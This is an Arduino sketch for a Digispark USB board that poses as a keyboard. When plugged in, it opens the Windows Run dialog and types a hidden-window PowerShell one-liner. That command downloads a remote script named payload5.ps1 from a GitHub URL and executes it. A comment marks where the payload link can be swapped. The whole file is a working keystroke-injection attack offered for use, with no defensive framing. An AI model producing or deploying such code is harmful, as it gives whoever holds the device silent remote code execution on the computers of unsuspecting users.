#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // Enable LED
  digitalWrite(1, LOW); // Turn LED off
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Opens the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Writes the command
  DigiKeyboard.print("powershell -w h ");
  DigiKeyboard.print("iex (irm \"");
  DigiKeyboard.print("https://raw.githubusercontent.com/BrianJ-4/PowershellScripts/main/payload5.ps1");  // LINK HERE
  DigiKeyboard.print("\")");
  // Enters it
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  digitalWrite(1, HIGH);
  delay(100);
  
  digitalWrite(1, LOW);
  delay(100);
}
